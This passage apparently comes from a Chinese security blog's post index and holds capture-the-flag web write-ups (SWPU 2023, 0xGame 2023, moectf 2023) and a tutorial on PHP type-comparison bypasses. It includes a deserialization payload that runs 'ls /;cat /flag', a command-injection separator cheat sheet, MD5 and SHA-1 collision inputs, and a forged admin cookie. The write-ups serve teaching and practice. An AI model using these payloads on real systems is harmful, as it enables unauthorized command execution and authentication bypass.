class="string">&quot;SWPU&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Now you know how to use __construct&lt;br/&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;your notes&quot;</span>.<span class="variable language_">$this</span>-&gt;notes;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;N0!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">F</span>(<span class="string">&quot;SWPU&quot;</span>,<span class="string">&quot;NSS&quot;</span>);</span><br><span class="line"><span class="variable">$nss</span>=<span class="keyword">new</span> <span class="title function_ invoke__">NSS</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;notes=<span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;sth=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;whoami=<span class="variable">$nss</span>;</span><br><span class="line"><span class="variable">$nss</span>-&gt;cmd=<span class="string">&quot;ls /;cat /flag&quot;</span>; <span class="comment">//命令执行</span></span><br><span class="line"><span class="variable">$re</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;F&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;SWPU&quot;;s:6:&quot;passwd&quot;;s:3:&quot;NSS&quot;;s:5:&quot;notes&quot;;O:1:&quot;T&quot;:1:&#123;s:3:&quot;sth&quot;;O:1:&quot;C&quot;:1:&#123;s:6:&quot;whoami&quot;;O:3:&quot;NSS&quot;:1:&#123;s:3:&quot;cmd&quot;;s:14:&quot;ls /;cat /flag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//更改后：O:1:&quot;F&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;SWPU&quot;;s:6:&quot;passwd&quot;;s:3:&quot;NSS&quot;;s:5:&quot;notes&quot;;O:1:&quot;T&quot;:1:&#123;s:3:&quot;sth&quot;;O:1:&quot;C&quot;:1:&#123;s:6:&quot;whoami&quot;;O:3:&quot;NSS&quot;:2:&#123;s:3:&quot;cmd&quot;;s:14:&quot;ls /;cat /flag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;O:1:&quot;F&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;SWPU&quot;;s:6:&quot;passwd&quot;;s:3:&quot;NSS&quot;;s:5:&quot;notes&quot;;O:1:&quot;T&quot;:1:&#123;s:3:&quot;sth&quot;;O:1:&quot;C&quot;:1:&#123;s:6:&quot;whoami&quot;;O:3:&quot;NSS&quot;:2:&#123;s:3:&quot;cmd&quot;;s:14:&quot;ls /;cat /flag&quot;;&#125;&#125;&#125;&#125;&#x27;</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ser=TzoxOiJGIjozOntzOjQ6InVzZXIiO3M6NDoiU1dQVSI7czo2OiJwYXNzd2QiO3M6MzoiTlNTIjtzOjU6Im5vdGVzIjtPOjE6IlQiOjE6e3M6Mzoic3RoIjtPOjE6IkMiOjE6e3M6Njoid2hvYW1pIjtPOjM6Ik5TUyI6Mjp7czozOiJjbWQiO3M6MTQ6ImxzIC87Y2F0IC9mbGFnIjt9fX19</span><br></pre></td></tr></table></figure><h2 id="查查need"><a href="#查查need" class="headerlink" title="查查need"></a>查查need</h2><p><img src="/2023/10/14/SWPU2023-web/7-1.png"></p><p>提示利用万能密码，并且<code>student_id</code>有前端限制，猜测注入点在<code>student_id</code>,有个附件，没用什么用，其他两个参数随便填，sqlmap一把梭：</p><p>位置：<code>Database:school Table:students Columns:grade</code></p><p><img src="/2023/10/14/SWPU2023-web/7-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于强比较与弱比较的区别</title>
      <link href="/2023/10/14/%E5%85%B3%E4%BA%8E%E5%BC%BA%E6%AF%94%E8%BE%83%E4%B8%8E%E5%BC%B1%E6%AF%94%E8%BE%83%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2023/10/14/%E5%85%B3%E4%BA%8E%E5%BC%BA%E6%AF%94%E8%BE%83%E4%B8%8E%E5%BC%B1%E6%AF%94%E8%BE%83%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于强类型比较与弱类型比较区别"><a href="#关于强类型比较与弱类型比较区别" class="headerlink" title="关于强类型比较与弱类型比较区别"></a>关于强类型比较与弱类型比较区别</h1><h2 id="x3D-x3D-弱类型比较"><a href="#x3D-x3D-弱类型比较" class="headerlink" title="&#x3D;&#x3D; 弱类型比较"></a>&#x3D;&#x3D; 弱类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">与数字进行比较时，从数字开始截断至遇到第一个字母</span><br><span class="line"><span class="string">&quot;88&quot;</span>==<span class="number">88</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&quot;88aa&quot;</span>==<span class="number">88</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&quot;aa88&quot;</span>==<span class="number">88</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">&quot;aa88&quot;</span>==<span class="number">0</span> <span class="comment">//false</span></span><br><span class="line">与判断符比较时，除<span class="number">0</span>外都为<span class="literal">true</span></span><br><span class="line">“aaa”==<span class="literal">true</span> <span class="comment">//true</span></span><br><span class="line"><span class="number">111</span>==<span class="literal">true</span> <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span>==<span class="literal">true</span> <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p><strong>弱类型只会比较参数的值（传入参数时，会将参数转化为同一类型）</strong>，也就是说，如果是<code>md5($a)==md5($b)</code>,那么传入的a、b只会比较转化为md5后的值，此时可以有以下绕过：</p><ul><li>传入数组，因为在传入数组时，md5函数会直接返回false,false&#x3D;false成立</li><li>传入的字符串md5加密后为0e……，在进行弱比较时，将0e……转化为数字后，会被认为是<strong>科学计数法</strong>，而0e……的科学计数法表示的数为0，也就是0&#x3D;&#x3D;0成立</li></ul><h2 id="x3D-x3D-x3D-强类型比较"><a href="#x3D-x3D-x3D-强类型比较" class="headerlink" title="&#x3D;&#x3D;&#x3D; 强类型比较"></a>&#x3D;&#x3D;&#x3D; 强类型比较</h2><p><strong>强类型比较不仅会比较参数的值，还会比较参数的类型</strong>，也就是说，如果是<code>md5($a)===md5($b)</code>，那么传入的a、b会比较转化为md5后的字符串，此时可以有以下绕过：</p><ul><li><p>传入数组，理由同弱比较</p></li><li><p>传入md5值相同的字符串，进行md5强碰撞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br><span class="line">b=0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</span><br></pre></td></tr></table></figure></li></ul><p>sha1($a)&#x3D;&#x3D;&#x3D;sha1($b)，可构建两个<strong>SHA-1</strong>值相同但不一样的pdf文件<a href="https://shattered.it/static/shattered-1.pdf">1.pdf</a>和<a href="https://shattered.it/static/shattered-2.pdf">2.pdf</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line"></span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure><p>如果遇到<code>substr(md5($a),0,x)===&quot;某一字符串&quot;</code>，这时候意思就是$a的md5值的前x个字符等于这个字符串，可以写脚本进行md5碰撞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMd5</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">100000000000000</span>):<span class="comment">#这里范围通过截取字符串长度确定</span></span><br><span class="line">        xx=i</span><br><span class="line">        md5_xx=hashlib.md5(<span class="built_in">str</span>(xx).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_xx[<span class="number">0</span>:x]==val:</span><br><span class="line">            <span class="keyword">return</span> xx</span><br><span class="line">        </span><br><span class="line">result=getMd5(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="与强弱类型比较相似的函数"><a href="#与强弱类型比较相似的函数" class="headerlink" title="与强弱类型比较相似的函数"></a>与强弱类型比较相似的函数</h2><h3 id="strcmp函数，比较两字符串，相同返回0-与强类型比较相似"><a href="#strcmp函数，比较两字符串，相同返回0-与强类型比较相似" class="headerlink" title="strcmp函数，比较两字符串，相同返回0,与强类型比较相似"></a>strcmp函数，比较两字符串，相同返回0,与强类型比较相似</h3><p>由于此函数<strong>只能比较字符串</strong>，当传入<strong>数字或数组</strong>时，会直接返回null，形成0&#x3D;&#x3D;0。</p><h3 id="switch函数，传入值时会将值转化为整数类型，与弱比较类型相似"><a href="#switch函数，传入值时会将值转化为整数类型，与弱比较类型相似" class="headerlink" title="switch函数，传入值时会将值转化为整数类型，与弱比较类型相似"></a>switch函数，传入值时会将值转化为整数类型，与弱比较类型相似</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;3aa&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;11111&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;22222&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;33333&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="comment">//33333</span></span><br></pre></td></tr></table></figure><h3 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h3><p>自动从首项开始，截止到一个整数，与弱类型比较相似，但如果传入的参数是一个表达式，会优先计算表达式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;1e3&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>); <span class="comment">//1</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>+<span class="number">1</span>); <span class="comment">//1001</span></span><br></pre></td></tr></table></figure><h3 id="is-numeric函数"><a href="#is-numeric函数" class="headerlink" title="is_numeric函数"></a>is_numeric函数</h3><p>判断是否为数字字符串，若将非数字字符串转化为16进制数，也会被认为是数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="number">111</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;111&#x27;</span>)<span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;111.1&#x27;</span>)<span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="number">0x776179</span>)<span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;0x776179&#x27;</span>)<span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;111a&#x27;</span>)<span class="comment">//false</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 web</title>
      <link href="/2023/10/11/0xGame2023-web/"/>
      <url>/2023/10/11/0xGame2023-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0xGame-2023"><a href="#0xGame-2023" class="headerlink" title="0xGame 2023"></a>0xGame 2023</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><img src="/2023/10/11/0xGame2023-web/1-1.png"></p><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><p><img src="/2023/10/11/0xGame2023-web/2-1.png"></p><p>先是md5弱比较绕过，两个的md5值都为0即可，然后传入的c要三个条件：</p><ul><li>不是数字（添加其他字符绕过）</li><li>不等于1024（添加小数绕过）</li><li>取整等于1024（整数部分等于1024即可）</li></ul><p>然后就是文件包含，通过php伪协议读取flag。</p><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p><img src="/2023/10/11/0xGame2023-web/3-1.png"></p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>目录扫描，发现了.git泄露，用工具GitHack失败，利用          <strong><a href="https://github.com/gakki429/Git_Extract">Git_Extract</a></strong>    拿到目录：</p><p><img src="/2023/10/11/0xGame2023-web/4-1.png"></p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>首先将前端限制删除，然后通过提示找到<code>/api.php?source</code>：</p><p><img src="/2023/10/11/0xGame2023-web/5-1.png"></p><p>后面测试了一下，空格用${IFS}是可以的，不知道最开始做的时候为什么不行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot; &quot; -&gt; %09 $&#123;IFS&#125;</span><br><span class="line">&quot;;&quot; -&gt; %0a</span><br><span class="line">常用管道符(windows):</span><br><span class="line">“|”:直接执行后面的语句。如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:如果前面执行的语句出错泽执行后面的语句，前面的语句智能为假 如：ping 2 || whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 如 ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。例如:ping 127.0.0.1&amp;&amp;whoami</span><br><span class="line">(Linux):</span><br><span class="line">“;”:执行完前面的语句再执行后面的 例如:ping 127.0.0.1;whoami</span><br><span class="line"></span><br><span class="line">“|”:显示后面语句的执行结果 例如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:当前面的语句只能怪出错时，执行后面的语句，例如:ping 1||whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如:ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真 例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf2023 web</title>
      <link href="/2023/10/10/moectf2023-web/"/>
      <url>/2023/10/10/moectf2023-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="moectf2023-web"><a href="#moectf2023-web" class="headerlink" title="moectf2023 web"></a>moectf2023 web</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">this is GET method,</span><br><span class="line">your mission:</span><br><span class="line"></span><br><span class="line">1.use parameter: UwU=u</span><br><span class="line">2.post **form**: Luv=u</span><br><span class="line">3.use admin character</span><br><span class="line">4.request from 127.0.0.1</span><br><span class="line">5.use browser &#x27;MoeBrowser&#x27;</span><br><span class="line">Complete All Missions</span><br></pre></td></tr></table></figure><p>根据题目满足这些要求即可，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:?UwU=u</span><br><span class="line">POST:Luv=u</span><br><span class="line">cookies:character=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent:MoeBrowser</span><br></pre></td></tr></table></figure><h2 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h2><p>直接下载附件，附件最后有一串16进制的密码，先hex解码，在base64解码，得到flag</p><h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>提示在聊天记录中，翻看聊天记录，发现有一条撤回的消息很可疑，F12查看这条消息：</p><p><img src="/2023/10/10/moectf2023-web/3-1.png"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>下载附件，提示用post-json方式传值注册登录，get方式读取flag，先传值登录试试：</p><p><img src="/2023/10/10/moectf2023-web/4-1.png"></p><p>读取flag：</p><p><img src="/2023/10/10/moectf2023-web/4-2.png"></p><p>提示不是管理员，题目提示这题是cookie，发现cookie是base64编码，解码后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;bob&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;</span><br></pre></td></tr></table></figure><p>将role改为admin并base64加密，所以payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;bob&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/10/moectf2023-web/4-3.png"></p><h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><p><img src="/2023/10/10/moectf2023-web/5-1.png"></p><p>题目要求在第一次输入值后0.5秒内完成指定操作，完成5次应该就会给flag，所以直接写脚本跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://localhost:55520/&quot;</span> <span class="comment">#你的题目url</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.81&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">steering_control=<span class="number">0</span></span><br><span class="line">throttle=<span class="number">2</span></span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;driver&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;steering_control&#x27;</span>:steering_control,</span><br><span class="line">        <span class="string">&#x27;throttle&#x27;</span>:throttle,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    response = session.post(url=url, headers=headers, data=data).text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res1=re.search(<span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;(.*)&lt;/font&gt;&#x27;</span>,response)</span><br><span class="line">        res=<span class="built_in">str</span>(res1.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;直行&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        steering_control=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;左&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        steering_control=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;右&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        steering_control=-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;大&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        throttle=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;小&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        throttle=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res.find(<span class="string">&#x27;保持&#x27;</span>)&gt;-<span class="number">1</span>:</span><br><span class="line">        throttle=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>但是我跑了7次才出来了flag，不知道为啥。</p><h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>文件上传漏洞，F12发现upload.php，直接访问，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 